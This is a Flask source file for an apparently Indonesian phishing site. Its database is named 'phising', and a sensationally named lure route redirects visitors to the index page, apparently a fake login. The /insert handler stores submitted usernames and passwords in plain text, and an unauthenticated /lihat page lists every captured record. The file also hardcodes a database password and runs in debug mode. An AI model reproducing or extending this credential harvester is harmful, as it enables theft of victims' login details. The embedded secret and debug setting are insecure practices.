from flask import Flask, render_template, request, redirect, url_for
from flask_mysqldb import MySQL

app = Flask(__name__)

app.config['MYSQL_HOST'] = 'localhost'
app.config['MYSQL_USER'] = 'farhan'
app.config['MYSQL_PASSWORD'] = 'CintaSejati22'
app.config['MYSQL_DB'] = 'phising'

mysql = MySQL(app)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/bahaya-masturbasi')
def bahaya():
    v = 1
    if v == 1:
        return redirect(url_for('index'))
    return render_template('bahaya.html')

@app.route('/lihat')
def lihat():
    cur = mysql.connection.cursor()
    cur.execute("SELECT * FROM user")
    data = cur.fetchall()
    return render_template('lihat.html', user = data)

@app.route('/insert', methods=['POST'])
def insert():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']

        cur = mysql.connection.cursor()
        cur.execute("INSERT INTO user (username, password) VALUES (%s, %s)", (username, password))
        mysql.connection.commit()
        return redirect(url_for('index'))


if __name__ == '__main__':
    app.run(debug=True, port=3000)